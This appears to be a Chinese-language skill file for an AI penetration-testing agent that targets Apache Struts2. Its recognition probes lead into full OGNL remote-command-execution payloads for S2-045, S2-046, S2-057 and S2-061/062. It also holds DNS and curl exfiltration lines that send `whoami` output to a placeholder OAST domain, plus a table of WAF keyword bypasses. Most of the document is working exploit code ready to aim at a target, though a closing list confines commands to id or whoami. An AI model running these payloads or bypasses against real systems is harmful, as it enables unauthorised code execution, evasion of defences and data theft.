---
name: framework-struts2
description: Apache Struts2 专项：S2-045/046 Content-Type 与 Content-Disposition OGNL 注入、S2-057 命名空间注入、S2-061/062 参数 OGNL、S2-016/032 旧链、.action/.do 路由识别、OGNL 无回显外带、WAF 关键字拆解。含无害探测（算术后回显）到命令执行阶梯
whenToUse: "URL 出现 .action/.do 后缀、响应头有 Struts、报错页含 ognl/xwork2、Content-Type 被服务端解析、Java 资产 + 老版本框架特征"
role: vuln-scan
enabled: true
---

# Struts2 专项

> 来源：`knowledge-sources/src-hunter-skill/references/payloader/by-category/web/框架漏洞.md` 第 554–832 行（struts2-rce / struts2-ognl 两节）
> 知识库：`redteam_poc_search("struts2")`

## 1. 识别（零风险）

```bash
# 路由后缀
curl -s -o /dev/null -w '%{http_code}\n' "https://$TARGET/index.action"
curl -s -o /dev/null -w '%{http_code}\n' "https://$TARGET/index.do"

# 报错页特征（构造非法 OGNL 触发）
curl -s "https://$TARGET/index.action?x=%25%7B1%2B1%7D" | grep -iE "ognl|xwork2|struts"
```

| 信号 | 判定 |
|---|---|
| `.action` / `.do` 返回 200 或业务页 | Struts2 可能性高 |
| 报错含 `ognl.OgnlException` / `xwork2` | **确认** |
| `struts.token` / `WW-` 前缀错误码 | 确认 |

## 2. 无害算术探测（先做，不执行命令）

```bash
# S2-045 面：Content-Type 里塞 OGNL 算术
curl -s -D - "https://$TARGET/" \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm)}" \
  -o /dev/null | head -20

# S2-057 面：命名空间注入，返回 222 即存在
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "https://$TARGET/\${111+111}/index.action"
curl -s "https://$TARGET/\${111+111}/index.action" | grep -o "222"
```

## 3. 命令执行阶梯

### S2-045（CVE-2017-5638）— Content-Type 注入

```bash
curl -s "https://$TARGET/" \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

### S2-046 — Content-Disposition 注入

```
Content-Disposition: form-data; name="upload"; filename="%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```

### S2-057（CVE-2018-11776）— 命名空间

```
http://target/${(111+111)}/test.action          # 回显 222 = 存在
http://target/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/test.action
```

### S2-061 / S2-062（CVE-2020-17530）— 参数 OGNL

```http
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%25%7b%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%40java.lang.Runtime%40getRuntime().exec(%27id%27)%7d
```

## 4. 无回显外带

S2-045 常见被 WAF 拦或响应不回显，走 DNS：

```
(#cmd='nslookup $(whoami).OAST_DOMAIN').(...).(#p.start())
# 或
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#p=new java.lang.ProcessBuilder({'curl','http://OAST_DOMAIN/'})).(#p.start())}
```

## 5. WAF 对抗要点

| 拦截点 | 绕过 |
|---|---|
| `%{` 被拦 | 双写 `%25%7B`、大小写、URL 二次编码 |
| `ognl` 关键字 | `@ognl.OgnlContext` 拆成 `@ognl@OgnlContext` 或反射 |
| `Runtime` 关键字 | `java.la` + `ng.Runtime` 拼接 |
| `ProcessBuilder` | 用 `ScriptEngineManager` 或 `freemarker` 侧信道 |
| 整段被拦 | 换注入位：Content-Type → Content-Disposition → `X-Forwarded-Host` → 参数名 |

## 6. 定级

| 结果 | 定级 |
|---|---|
| 算术回显 222 | 仅证明 OGNL 求值，Medium（信息） |
| 命令回显 `uid=` | **Critical** |
| 仅 DNS 外带 | Critical（附 DNS 日志原文） |

## 纪律

- 命中的命令只跑 `id` / `whoami` / `hostname`，**不落文件、不反弹 shell、不读业务数据**
- 先算术后命令：算术无回显就不要硬上命令，改用外带
- 每条 payload 只用一次，避免被频控判成扫描器
